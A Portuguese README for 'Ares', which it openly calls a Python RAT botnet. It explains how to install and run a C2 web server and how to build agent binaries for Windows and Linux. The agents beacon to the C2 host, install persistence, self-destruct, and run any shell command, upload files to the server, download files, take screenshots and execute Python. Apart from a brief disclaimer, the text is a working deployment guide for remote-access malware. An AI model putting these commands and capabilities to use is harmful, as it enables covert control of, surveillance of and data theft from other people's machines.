![image](https://cdn.freebiesupply.com/logos/thumbs/2x/ares-01-logo.png)

# Ares

Ares é uma botnet do tipo RAT (Remote Access Tool) escrita em Python.

__ADVERTÊNCIA: Utilize este software apenas de acordo com a legislação atual. O uso indevido deste software pode suscitar questões legais e éticas pelas quais não apoio e nem me responsabilizo .__

Ares foi desenvolvido em cima de duas aplicações principais:

- Um servidor C2 com interface web para gerência e administração dos agentes (bot master and C²)
- Um programa agente (agent), que é executado no host comprometido, e garante a comunicação com o C2

A interface da Web pode ser executada em qualquer servidor executando o Python. O agente pode ser compilado em executáveis nativos usando o ** pyinstaller **.

## Setup

Instalando as dependências:

```
apt install python-pip -y
git clone https://github.com/vinicius3cta/Ares.git
cd Ares
pip install -r requirements.txt
```

Inicializando a base de dados:

```
cd server
./ares.py initdb
```

Se quiser compilar executáveis para Windows, rode as configurações do Wine (opcional):

```
cd ..
./wine_setup.sh
```

## Server

Rode o webserver em python (suporta nodo debbuging):

```
./ares.py runserver -h 0.0.0.0 -p 8080 --threaded
```

Ou rode usando gunicorn:

```
gunicorn ares:app -b 0.0.0.0:8080 --threads 20
```

Seu servidor estará acessível em http://localhost:8080

## Agent

Rode o agente em python (altere as opções do config.py para adaptar ao seu cenário):

```
cd agent
./agent.py
```

Construa um binário standalone:

```
./builder.py -p Linux --server http://localhost:8080 -o agent
./agent
``` 

Para ver uma lista de opções suportadas, rode ./builder.py -h

```
./agent/builder.py -h
usage: builder.py [-h] -p PLATFORM --server SERVER -o OUTPUT
                  [--hello-interval HELLO_INTERVAL] [--idle_time IDLE_TIME]
                  [--max_failed_connections MAX_FAILED_CONNECTIONS]
                  [--persistent]

Builds an Ares agent.

optional arguments:
  -h, --help            show this help message and exit
  -p PLATFORM, --platform PLATFORM
                        Target platform (Windows, Linux).
  --server SERVER       Address of the CnC server (e.g http://localhost:8080).
  -o OUTPUT, --output OUTPUT
                        Output file name.
  --hello-interval HELLO_INTERVAL
                        Delay (in seconds) between each request to the CnC.
  --idle_time IDLE_TIME
                        Inactivity time (in seconds) after which to go idle.
                        In idle mode, the agent pulls commands less often
                        (every <hello_interval> seconds).
  --max_failed_connections MAX_FAILED_CONNECTIONS
                        The agent will self destruct if no contact with the
                        CnC can be made <max_failed_connections> times in a
                        row.
  --persistent          Automatically install the agent on first run.
```

### Supported agent commands

```
<any shell command>
Executa o comando em um shell e retorna sua saída.

upload <local_file>
Faz uploads <local_file> para o servidor.

download <url> <destination>
Faz o downloads de um arquivo usando HTTP(S).

zip <archive_name> <folder>
Cria um arquivo zip no diretório especificado.

screenshot
Tira um screenshot.

python <command|file>
Executa um comando Python ou um arquivo local.

persist
Instala o agente (persistência).

clean
Desistala o agente.

exit
Mata o processo do agente.

help
Exibe este help.
```
